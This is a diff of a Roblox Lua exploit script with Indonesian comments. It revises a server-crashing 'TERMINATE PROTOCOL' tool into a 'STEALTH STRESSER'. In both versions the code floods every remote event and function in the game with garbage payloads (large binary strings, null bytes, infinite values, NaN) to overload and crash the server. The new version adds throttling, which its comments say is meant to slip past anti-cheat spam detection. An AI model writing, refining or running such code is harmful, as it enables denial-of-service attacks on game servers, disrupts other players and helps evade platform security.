@@ -5,95 +5,94 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
--- UI CLEANUP
-if CoreGui:FindFirstChild("Ikyy_EXTERMINATOR") then CoreGui:FindFirstChild("Ikyy_EXTERMINATOR"):Destroy() end
+-- UI Cleanup
+if CoreGui:FindFirstChild("Ikyy_Stealth_V18") then CoreGui:FindFirstChild("Ikyy_Stealth_V18"):Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "Ikyy_EXTERMINATOR"
+ScreenGui.Name = "Ikyy_Stealth_V18"
 ScreenGui.Parent = CoreGui
 
--- UI DESIGN (AGGRESSIVE RED)
+-- UI Design (Sleek Cyan - Stealth Look)
 local Main = Instance.new("Frame")
 Main.Size = UDim2.new(0, 240, 0, 160)
 Main.Position = UDim2.new(0.5, -120, 0.5, -80)
-Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
+Main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
 Main.Parent = ScreenGui
-local Corner = Instance.new("UICorner") Corner.CornerRadius = UDim.new(0, 10) Corner.Parent = Main
-local Stroke = Instance.new("UIStroke") Stroke.Thickness = 3 Stroke.Color = Color3.fromRGB(255, 0, 0) Stroke.Parent = Main
+local Corner = Instance.new("UICorner") Corner.CornerRadius = UDim.new(0, 12) Corner.Parent = Main
+local Stroke = Instance.new("UIStroke") Stroke.Thickness = 2 Stroke.Color = Color3.fromRGB(0, 255, 200) Stroke.Parent = Main
 
 local Title = Instance.new("TextLabel")
-Title.Text = "TERMINATE PROTOCOL V17"
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.Text = "STEALTH STRESSER V18"
+Title.Size = UDim2.new(1, 0, 0, 45)
+Title.TextColor3 = Color3.fromRGB(0, 255, 200)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 14
 Title.BackgroundTransparency = 1
 Title.Parent = Main
 
-local BrutalBtn = Instance.new("TextButton")
-BrutalBtn.Size = UDim2.new(0, 200, 0, 60)
-BrutalBtn.Position = UDim2.new(0.5, -100, 0.5, -10)
-BrutalBtn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-BrutalBtn.Text = "ENGAGE BRUTAL MODE"
-BrutalBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-BrutalBtn.Font = Enum.Font.GothamBold
-BrutalBtn.TextSize = 13
-BrutalBtn.Parent = Main
-local BCorner = Instance.new("UICorner") BCorner.CornerRadius = UDim.new(0, 8) BCorner.Parent = BrutalBtn
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Size = UDim2.new(0, 180, 0, 50)
+ToggleBtn.Position = UDim2.new(0.5, -90, 0.5, 0)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+ToggleBtn.Text = "ENGINE: STANDBY"
+ToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.TextSize = 12
+ToggleBtn.Parent = Main
+local BCorner = Instance.new("UICorner") BCorner.CornerRadius = UDim.new(0, 10) BCorner.Parent = ToggleBtn
 
--- LOGIKA BRUTAL (THE EXTERMINATOR)
-local Active = false
-local Garbage = string.rep("\255", 20000) -- Karakter biner berat (Memory Stress)
-local TableHell = {}
-for i = 1, 500 do table.insert(TableHell, {["Crash"] = Garbage, ["ID"] = math.random()}) end
+-- LOGIKA STEALTH (ANTI-KICK BYPASS)
+local IsRunning = false
+local Payloads = {
+    [1] = string.rep("\0", 500), -- Null bytes (Ringan tapi bingungkan server)
+    [2] = {["Data"] = math.huge, ["Target"] = "All"}, -- Table stress
+    [3] = "GetServerData", -- Perintah palsu
+    [4] = 0/0 -- NaN (Not a Number) untuk merusak kalkulasi
+}
 
-local function KillServer()
-    while Active do
-        -- STEP 1: PARALLEL REMOTE BOMBARDMENT
-        for i = 1, 50 do -- 50 Kali lipat per loop (Brutal)
-            task.spawn(function()
-                for _, r in pairs(game:GetDescendants()) do
-                    if not Active then break end
-                    if r:IsA("RemoteEvent") then
-                        -- Mengirim 3 Argumen Berat Sekaligus
-                        r:FireServer(TableHell, Garbage, Vector3.new(math.huge, math.huge, math.huge))
-                    elseif r:IsA("RemoteFunction") then
-                        -- RemoteFunction dikirim tanpa menunggu (Async)
-                        task.spawn(function() pcall(function() r:InvokeServer(TableHell) end) end)
-                    end
+local function ExecuteStealth()
+    while IsRunning do
+        -- Gunakan spawn agar tidak membeku (Client-side stability)
+        task.spawn(function()
+            -- Scan hanya Remote yang relevan agar tidak boros bandwidth
+            for _, r in pairs(game:GetDescendants()) do
+                if not IsRunning then break end
+                if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
+                    pcall(function()
+                        -- Mengirim 5 paket cepat per remote (Bukan ribuan sekaligus)
+                        for i = 1, 5 do
+                            local p = Payloads[math.random(1, #Payloads)]
+                            if r:IsA("RemoteEvent") then
+                                r:FireServer(p, p)
+                            else
+                                task.spawn(function() r:InvokeServer(p) end)
+                            end
+                        end
+                    end)
                 end
-            end)
-        end
-        
-        -- STEP 2: PHYSICS ENGINE STRESS (CLIENT-TO-SERVER REPLICATION)
-        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            pcall(function()
-                -- Memaksa server menghitung posisi mustahil secara konstan
-                LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1e32, 1e32, 1e32)
-                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
-            end)
-        end
-        
-        task.wait() -- Tanpa angka di wait() = Secepat refresh rate (BRUTAL)
+            end
+        end)
+        -- Jeda dinamis agar tidak dianggap 'Packet Spam' oleh Anti-Cheat
+        task.wait(0.2) 
     end
 end
 
-BrutalBtn.MouseButton1Click:Connect(function()
-    Active = not Active
-    if Active then
-        BrutalBtn.Text = "TERMINATING..."
-        BrutalBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-        BrutalBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
-        task.spawn(KillServer)
+ToggleBtn.MouseButton1Click:Connect(function()
+    IsRunning = not IsRunning
+    if IsRunning then
+        ToggleBtn.Text = "ENGINE: ACTIVE"
+        ToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 200)
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 40, 30)
+        task.spawn(ExecuteStealth)
     else
-        BrutalBtn.Text = "ENGAGE BRUTAL MODE"
-        BrutalBtn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-        BrutalBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        ToggleBtn.Text = "ENGINE: STANDBY"
+        ToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
+        ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
     end
 end)
 
--- DRAG LOGIC
-local d; local di; local ds; local sp
+-- Draggable Logic
+local d, di, ds, sp
 Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = true ds = i.Position sp = Main.Position end end)
 Main.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end end)
 UserInputService.InputChanged:Connect(function(i) if i == di and d then local del = i.Position - ds Main.Position = UDim2.new(sp.X.Scale, sp.X.Offset + del.X, sp.Y.Scale, sp.Y.Offset + del.Y) end end)
